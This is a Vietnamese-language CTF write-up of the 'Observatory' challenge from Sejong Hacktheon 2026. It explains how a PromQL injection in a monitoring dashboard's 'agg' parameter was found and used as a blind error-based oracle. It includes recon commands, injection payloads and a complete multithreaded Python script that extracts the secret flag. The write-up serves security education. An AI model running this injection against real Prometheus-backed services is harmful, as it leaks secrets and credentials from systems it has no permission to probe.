---
title: "Observatory"
date: 2026-04-29
platform: "Write-up CTF"
category: "Challenge"
difficulty: "Medium"
tags: ["challenge", "write-up-ctf"]
draft: false
---

## Challenge Information
- **Category**: Web Exploitation
- **Event**: Sejong Hacktheon 2026
- **Author**: Hidden
- **Difficulty**: Hidden
- **Tags**: #web #PromQL #BlackBox #Prometheus
---
## 1. Description
>Our cloud monitoring team built a shiny new dashboard. Each team gets their own metrics namespace. But rumor has it... someone hid a secret in the system metrics. Can you find it?
## 2. Overview
Truy cập vào link challenge mình chỉ thấy một form đăng nhập đơn giản (theo mô tả thì có lẽ đây là một dashboard để quản lý dịch vụ cloud nào đó):

![](./images/Pasted%20image%2020260428183437.png)

Thử register một account để truy cập vào bên trong thử:

![](./images/Pasted%20image%2020260428185303.png)

Các namespace của mỗi account là khác nhau và duy nhất, mỗi người sẽ có một namespace riêng để truy vấn data mà không ảnh hưởng đến các namespace khác, bất kể mình làm gì, giao diện chỉ hiển thị dữ liệu thuộc về `ns1458`.

![](./images/Pasted%20image%2020260429120838.png)

![](./images/Pasted%20image%2020260429120847.png)

![](./images/Pasted%20image%2020260429120858.png)

Bất kể mình điền ký tự gì miễn không phải số và ký tự đặt biệt thì sẽ không báo lỗi. Để phân tích sâu hơn mình sẽ tiến hành dùng các tool để recon.
## 3. Reconnaissance
### 1. Scanning
Dùng nmap:

```bash
nmap -sC -sV -p- 43.201.43.169
```

Khi quét port thì mình không thấy server chạy dịch vụ trên bất kỳ cổng nào khác ngoài `3000` nên mình cũng sẽ không chụp kết quả.

Dùng ffuf (mình sẽ sử dụng wordlist to hơn `common.txt` để tránh bỏ xót):

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt -u http://54.116.50.13:3000/FUZZ
```

![](./images/Pasted%20image%2020260428204257.png)

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt -u http://54.116.50.13:3000/FUZZ -X POST
```

![](./images/Pasted%20image%2020260428205556.png)

API Scanning:

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt -u http://54.116.50.13:3000/api/FUZZ
```

![](./images/Pasted%20image%2020260428204623.png)

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt -u http://54.116.50.13:3000/api/FUZZ -X POST
```

![](./images/Pasted%20image%2020260428204417.png)

Scan source client-side:
- `app.js`:

![](./images/Pasted%20image%2020260428204911.png)

Tổng hợp các endpoint tìm được:

| Route                            | Method   |
| -------------------------------- | -------- |
| `/login`, `/register`, `/logout` | GET/POST |
| `/`                              | GET      |
| `/api/metrics`                   | GET      |
| `/api/query`                     | POST     |
Nhìn qua ta có thể thấy các endpoint như `/login`, `/register`, `/logout`, `/api/query` là những endpoint ta đã sử dụng và test ở Overview, riêng endpoint `/api/metrics` là endpoint ẩn mà nhờ fuzzing ta mới tìm ra được.

### 2. Prometheus & PromQL

Truy cập vào `/api/metrics` (cần login), đúng như dự đoán của mình thì endpoint này show ra tất cả những thông tin có trong hệ thống (hơn 300 dòng):

![](./images/Pasted%20image%2020260428210432.png)

Trong đó mình phát hiện ra 3 keyword khá nhạy cảm là `db_credentials` (có thể là database chứa thông tin user), `secret_config` (có thể là các config bí mật nào đó) và `internal_token` (có thể là nơi lưu trữ token xác thực), vì đây là blackbox nên mình chỉ dừng lại ở việc dự đoán.

`/api/metrics` còn tiết lộ cho ta những thông tin quan trọng khác về tech stack mà hệ thống đang sử dụng như (phần này mình dùng AI phân tích):

- **`go_*` (ví dụ: `go_goroutines`, `go_memstats_alloc_bytes`,...):** Hệ thống đang thu thập dữ liệu từ một hoặc nhiều dịch vụ được viết bằng ngôn ngữ **Golang**. Điều này có thể hữu ích nếu ta cần khai thác các lỗi liên quan đến quản lý bộ nhớ hoặc đa luồng của Go.
    
- **`prometheus_*`:** Đây là máy chủ Prometheus tiêu chuẩn. Các số liệu như `prometheus_engine_queries` hay `prometheus_http_requests_total` xác nhận chúng ta đang đối mặt trực tiếp với lõi của Prometheus.

Từ keyword `prometheus` và `go` (`prometheus` được viết bằng `go`) phần nào mình cũng đoán ra hệ thống sử dụng hệ cơ sở dữ liệu **Prometheus** với ngôn ngữ truy vấn **PromQL** . Dựa trên phản hồi từ Burp Suite khiến mình càng chắc chắn hơn về điều này:

![](./images/Pasted%20image%2020260428230944.png)

Mặc dù ứng dụng web được viết bằng Node.js, nhưng cấu trúc JSON này lại là đặc trưng của **Prometheus**.

Một chút về **Prometheus & PromQL** để chứng minh giả thuyết trên: Prometheus là một cơ sở dữ liệu chuyên lưu trữ các metrics. Thay vì dùng SQL (như `SELECT * FROM...`) thì nó dùng ngôn ngữ truy vấn riêng là **PromQL**. 

Dữ liệu được lưu dưới dạng các nhãn (Labels). 
_Ví dụ:_ `secret_config{flag="secret", namespace="ns0000"}`  
(có thể kiểm chứng và xem thêm tại [ĐÂY](https://prometheus.io/docs/prometheus/latest/querying/api/) )

-> 99% Hệ thống dùng **PromQL** để truy vấn.

Lúc này mình cũng xác định được mục tiêu mình muốn hướng đến ở bài này là tận dụng PromQL để tìm cách inject một payload nào đó lấy được data từ trong các metrics như `secret_config`, `db_credentials` hay `internal_token`.

Bây giờ ta đã xác định được mục tiêu nhắm đến là các metrics chưa secret, nhưng inject vào đâu, vào endpoint nào để đâm được vào database thì chưa biết. 

### 3. Identify And Analyze Behavior
Dựa vào request / response ở ảnh Burp Suite trên thì mình thấy có 2 tham số được POST lên (`"metric"` và `"agg"`), nhưng vẫn chưa biết tham số nào sẽ trực tiếp truy vấn đến database, mình sẽ thử một số payload để xem hành vi của từng param:

- Cố tình gây lỗi với `metric`:

	![](./images/Pasted%20image%2020260429020049.png)

- Cố tình gây lỗi với `agg`:

	![](./images/Pasted%20image%2020260429020153.png)

-> Ta dễ dàng nhìn ra được tham số `agg` có vẻ nhạy cảm hơn nếu cố tình gây lỗi cú pháp PromQL. Từ đây ta sẽ có hướng khai thác là inject vào tham số `agg` này.

Sau khi đã biết điểm inject thì mình tiếp tục thử các payload khác để phân tích dịch ngược hành vi của backend:

- `{"metric":"kyrux", "agg":"sum"}` thành công (trong đó `up` là metric mặc định trong PromQL cho phép lấy trạng thái của đối tượng và `sum` là hàm lấy tổng):

	![](./images/Pasted%20image%2020260429092722.png)

- `{"metric":"kyrux", "agg":"up"}` gây lỗi Query failed:

	![](./images/Pasted%20image%2020260429092614.png)

- `{"metric":"up", "agg":"secret_config +"}`: thành công

	![](./images/Pasted%20image%2020260429092425.png)

- `{"metric":"up", "agg":"secret_config #"}`: Báo lỗi Invalid parameter khác thường hơn mọi khi (có thể là backend đã filter và chặn ở tầng backend)

	![](./images/Pasted%20image%2020260429090617.png)

Từ các hành vi trên thì mình có dự đoán rằng:
- Backend sẽ xử lý đầu query trước khi cho nó đâm vào database
- Các parameter sẽ được xử lý và đưa vào khuôn dạng: `${agg}(${metric}{namespace="..."})`
- Backend sẽ filter một số ký tự không cho phép.

Giải thích cho điều trên ta có thể nhìn lại các hành vi của backend (chỉ dự đoán vì không có source):
- `{"metric":"kyrux", "agg":"sum"}` -> `sum(kyrux{namespace="..."})` (thành công vì `sum` là một hàm).

- `{"metric":"kyrux", "agg":"up"}` -> `up(kyrux{namespace="..."})` (thất bại vì `up` là metric không phải hàm).

- `{"metric":"up", "agg":"secret_config +"}` -> `secret_config + (up{namespace="ns1458"})` (thành công vì vô tình đúng cú pháp).

- `{"metric":"up", "agg":"secret_config #"}` -> `secret_config # (kyrux{namespace="ns1458"})` (mặc dù đúng cú pháp nhưng `Invaid Parameter` vì backend filter).

-> Dựa vào các hành vi trên (việc backend tự thêm tag `namespace{}` vào query trước khi đâm vào database) ta có thể bypass bằng cách sử dụng một hàm mặc định bất kỳ ở cuối payload để khi backend lấp vào thì sẽ là `{payload} + count(namespace{...})` -> Hoàn toàn bypass thành công.
## 4. Exploitation
Mục tiêu là lấy được các bản ghi từ trong metric `secret_config`. Vì hành vi của server chỉ có báo lỗi hoặc không lỗi -> Dạng Blind Injection dựa vào hành vi của server.

Trong PromQL, ta có thể lấy 1 bản ghi cộng với 1 bản ghi. Nhưng ta lấy **1 dòng cộng với 100 dòng** mà không chỉ định rõ cách ghép cặp (chỉ định label bằng toán tử `or()`), PromQL gây lỗi Runtime: _"multiple matches for labels"_ vì không xác định được hành vi.

Dựa vào nguyên lý này, mình có thể tạo ra một bộ check `true/false`:

- FLAG có bắt đầu bằng chữ 'A' không? (sử dụng `or()` để cộng, nếu không chỉ định nhãn cụ thể thì mặc định nó sẽ match tất cả)

	- **ĐÚNG**: Tìm thấy 1 bản ghi Lấy `1 + 100` = lỗi Many To One -> Biết là `A` đúng.
	- **SAI**: Tìm thấy 0 bản ghi (rỗng). Lấy `rỗng + 100` = rỗng, không gây lỗi -> Biết là `A` sai.

Payload thử nghiệm sẽ như sau:

```json
{
  "metric": "up",
  "agg": "secret_config{flag=~\"a.*\"} + on() (up or count(up)) + count"
}
```

Giải thích payload:

- Dùng label `{flag}` để lấy dữ liệu của cột này.

- Ở đây mình dùng wildcard `.*` với mục đích kiểm tra xem dữ liệu có bắt đầu bằng ký từ "a" hay không (dĩ nhiên a sẽ là biến thử).

- Mình sử dụng `up or count(up)` để đảm bảo vế phải luôn có 2 bản ghi trở lên.

- `+ count` để bypass cơ chế tự thêm tag name của backend (theo như dự đoán bên trên).

Mình sẽ brute force bằng intruder của Burp Suite trước cho tiện =)) character set: 

```
`abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!"#$%&'()*+,-./:;<=>?@[\]^_`{|}~`
```

![](./images/Pasted%20image%2020260429115250.png)

Fuzzing:

![](./images/Pasted%20image%2020260429115605.png)

Dễ thấy ký tự `h`, `F` có độ dài khác biệt nhất (`(` và `)` là do lỗi escape nên tạm thời mình không quan tâm), và như dự đoán thì payload ta đã hoạt động thành công.

Việc xuất hiện cả `h` và `F` cho thấy bài này có 2 bản ghi ở `secret_config` nên cũng không quá lo lắng hẹ hẹ.

Oke và bây giờ chỉ cần viết script để lấy FLAG thôi =))
## 5. PoC
Mình sẽ nâng cấp script brute force truyền thống bằng cách sử dụng kỹ thuật đa luồng để tối ưu hóa tốc độ (nên hạn chế thread vì có thể tạo DoS attack):

```python
import requests  
import string  
import urllib3  
import concurrent.futures  
  
urllib3.disable_warnings()  
  
TARGET_URL = 'http://54.116.50.13:3000'  
USERNAME = 'khanh'  
PASSWORD = 'khanh'  
MAX_WORKERS = 15  # nên hạn chế vì có thể tạo DoS attack
  
session = requests.Session()  
  
adapter = requests.adapters.HTTPAdapter(pool_connections=MAX_WORKERS, pool_maxsize=MAX_WORKERS)  
session.mount('http://', adapter)  
session.mount('https://', adapter)  
  
try:  
    login_response = session.post(  
        f'{TARGET_URL}/login',  
        data={'username': USERNAME, 'password': PASSWORD},  
        allow_redirects=False,  
        timeout=5  
    )  
    if login_response.status_code not in [200, 302]:  
        print("[!] Cảnh báo: Đăng nhập có thể thất bại. Vui lòng kiểm tra lại tài khoản.")  
except Exception as e:  
    print(f"[-] Lỗi kết nối khi đăng nhập: {e}")  
    exit(1)  
  
def escape_regex_char(char):  
    if char.isalnum() or char == '_':  
        return char  
    if char in '{}-.:/ ':  
        return f'[{char}]'  
    return f'[{char}]'  
  
  
def test_promql_oracle(test_string):  
    regex_pattern = '^' + ''.join(escape_regex_char(c) for c in test_string) + '.*'  
  
    promql_payload = f'secret_config{{flag=~"{regex_pattern}"}} + on() (up or count(up)) + count'  
    try:  
        response = session.post(  
            f'{TARGET_URL}/api/query',  
            json={'metric': 'up', 'agg': promql_payload},  
            timeout=15  
        )  
        response_text = response.text  
  
        is_match = 'Query failed' in response_text  
        return test_string, is_match  
  
    except requests.exceptions.RequestException:  
        return test_string, False  
  
print("=== BẮT ĐẦU ===")  
  
current_flag = 'h' # prefix  
charset = string.ascii_letters + string.digits + '{_-}'  
  
_, is_base_working = test_promql_oracle(current_flag)  
print(f'[*] Kiểm tra Oracle cơ sở với tiền tố "{current_flag}": {"HOẠT ĐỘNG TỐT" if is_base_working else "THẤT BẠI"}')  
  
if not is_base_working:  
    print("[-] Dừng script. Vui lòng kiểm tra lại Cookie, IP server hoặc tiền tố khởi tạo.")  
    exit(1)  
  
MAX_FLAG_LENGTH = 50  
  
for position in range(MAX_FLAG_LENGTH):  
    found_chars = []  
    print(f"\n[*] Đang quét vị trí thứ {len(current_flag) + 1} | Độ dài hiện tại: {current_flag}")  
  
    with concurrent.futures.ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:  
        future_to_char = {  
            executor.submit(test_promql_oracle, current_flag + char): char  
            for char in charset  
        }  
  
        for future in concurrent.futures.as_completed(future_to_char):  
            tested_string, is_match = future.result()  
  
            if is_match:  
                matched_char = tested_string[-1]  
                found_chars.append(matched_char)  
                print(f"[+] Tìm thấy ký tự: '{matched_char}'")  
  
    if len(found_chars) == 1:  
        current_flag += found_chars[0]  
        print(f"[!] Update: {current_flag}")  
  
        if found_chars[0] == '}':  
            print('\n Đã ra flag')  
            break  
  
    elif len(found_chars) > 1:  
        print(f'\n[-] Có quá nhiều ký tự khớp cùng lúc {found_chars}.')  
        break  
    else:  
        print(f'\n[-] Lỗi tại: {current_flag}. Không có ký tự nào trong charset khớp.')  
        break  
  
print('=' * 50)  
print('FLAG:', current_flag)  
print('=' * 50)
```

Nếu để prefix là rỗng:

![](./images/Pasted%20image%2020260429120238.png)

Chọn ký tự bắt đầu để xem từng bản ghi, chọn thử `F`:

![](./images/Pasted%20image%2020260429120411.png)

Chọn ký tự `h` còn lại và lấy flag thôi:

![](./images/Pasted%20image%2020260428182801.png)

```
hacktheon2026{pr0m3th3us_m3tr1c_s1d3ch4nn3l}
```

>h@ppy h@ck!n9 
>*(BKSEC)*